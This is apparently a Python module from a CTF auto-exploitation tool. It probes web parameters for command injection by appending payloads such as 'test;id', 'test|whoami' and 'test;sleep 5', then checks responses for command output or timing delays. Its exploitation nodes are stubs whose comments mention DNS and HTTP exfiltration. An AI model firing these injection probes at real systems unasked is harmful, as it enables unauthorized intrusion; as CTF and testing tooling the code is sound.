"""Command Injection detection and exploitation trees (W-CMD-Detect & W-CMD-Exploit).

Implements command injection detection from detections.md:
- W-C.1: Output-based detection (direct output in response)
- W-C.2: Time-based blind detection (sleep/delay in response time)
"""
from typing import Dict, Any, Optional
import logging
import time
import re

from ctf_autopwn.core.nodes import DecisionNode
from ctf_autopwn.core.types import (
    NodeResult, NodeStatus, VulnDescriptor, VulnType
)
from ctf_autopwn.adapters.curl_adapter import CurlAdapter

logger = logging.getLogger(__name__)


class CMDDetectOutputNode(DecisionNode):
    """W-C.1: Output-based command injection detection."""
    
    def __init__(self):
        super().__init__("cmd_detect_output", "CMD: Output-Based Detection")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test if command output is reflected in response."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[cmd] Testing output-based command injection on {param_name}")
        
        try:
            # Test with command that produces predictable output
            # Try various separators: ; | & newline
            separators = [";", "|", "&", "||"]
            test_commands = ["id", "whoami", "echo CMDTEST"]
            
            for sep in separators:
                for cmd in test_commands:
                    payload = f"test{sep}{cmd}"
                    url = f"{endpoint}?{param_name}={payload}"
                    
                    result = self.curl.run(url, {})
                    body = result.get("body", "")
                    
                    # Look for output indicators
                    output_indicators = [
                        r"uid=\d+",  # id output
                        r"root|www-data|nobody",  # whoami output
                        r"CMDTEST",  # echo output
                        r"drwxr",  # ls-like output
                    ]
                    
                    for indicator in output_indicators:
                        if re.search(indicator, body):
                            logger.info(f"[cmd] Found command output indicator: {indicator}")
                            return NodeResult(
                                status=NodeStatus.SUCCESS,
                                data={
                                    "is_cmd_injection": True,
                                    "separator": sep,
                                    "indicator": indicator,
                                }
                            )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_cmd_injection": False}
            )
        
        except Exception as e:
            logger.error(f"[cmd] Output detection failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS:
            if result.data.get("is_cmd_injection"):
                return CMDExploitOutputNode()
            else:
                return CMDDetectBlindNode()
        return None


class CMDDetectBlindNode(DecisionNode):
    """W-C.2: Time-based blind command injection detection."""
    
    def __init__(self):
        super().__init__("cmd_detect_blind", "CMD: Blind Detection")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test if command execution is blind (no output, but time difference)."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[cmd] Testing blind command injection on {param_name}")
        
        try:
            # Baseline request
            start = time.time()
            result_baseline = self.curl.run(endpoint, {})
            baseline_time = time.time() - start
            
            # Request with sleep command (5 second delay)
            separators = [";", "|", "&", "||"]
            
            for sep in separators:
                # Try sleep for 5 seconds
                payload = f"test{sep}sleep 5"
                url = f"{endpoint}?{param_name}={payload}"
                
                start = time.time()
                result_sleep = self.curl.run(url, {})
                sleep_time = time.time() - start
                
                # If delay is significant (> 4 seconds), likely blind RCE
                if sleep_time > 4.0:
                    logger.info(f"[cmd] Blind RCE detected: {sleep_time:.2f}s delay")
                    return NodeResult(
                        status=NodeStatus.SUCCESS,
                        data={
                            "is_blind_cmd_injection": True,
                            "time_delay": sleep_time,
                            "separator": sep,
                        }
                    )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_blind_cmd_injection": False}
            )
        
        except Exception as e:
            logger.error(f"[cmd] Blind detection failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS:
            if result.data.get("is_blind_cmd_injection"):
                return CMDExploitBlindNode()
        return None


class CMDExploitOutputNode(DecisionNode):
    """Exploit output-based command injection."""
    
    def __init__(self):
        super().__init__("cmd_exploit_output", "CMD: Exploit Output-Based")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Execute arbitrary commands in output-based injection."""
        target_param = context.get("target_param")
        
        if not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing target param")
        
        logger.info(f"[cmd] Exploiting output-based injection")
        
        # In real scenario, would execute commands and extract output
        # For now, mark as exploitable
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={
                "exploitation": "output",
                "ready_for_commands": True,
            }
        )


class CMDExploitBlindNode(DecisionNode):
    """Exploit blind command injection (time-based or data exfil)."""
    
    def __init__(self):
        super().__init__("cmd_exploit_blind", "CMD: Exploit Blind RCE")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Execute arbitrary commands in blind injection scenario."""
        target_param = context.get("target_param")
        
        if not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing target param")
        
        logger.info(f"[cmd] Exploiting blind RCE")
        
        # In real scenario, would:
        # 1. Exfiltrate data via DNS/HTTP callbacks
        # 2. Use time-based extraction (binary search)
        # For now, mark as exploitable
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={
                "exploitation": "blind",
                "methods": ["time_based", "dns_exfil", "http_callback"],
            }
        )


# Summary
"""
Command Injection Detection Trees (W-CMD)

Detection nodes:
- W-C.1 (CMDDetectOutputNode) - Output-based RCE detection
- W-C.2 (CMDDetectBlindNode) - Time-based blind detection

Exploitation nodes:
- CMDExploitOutputNode - Execute commands with output
- CMDExploitBlindNode - Execute commands blindly (via time/callbacks)

Used by web reconnaissance tree to identify vulnerable endpoints.
"""
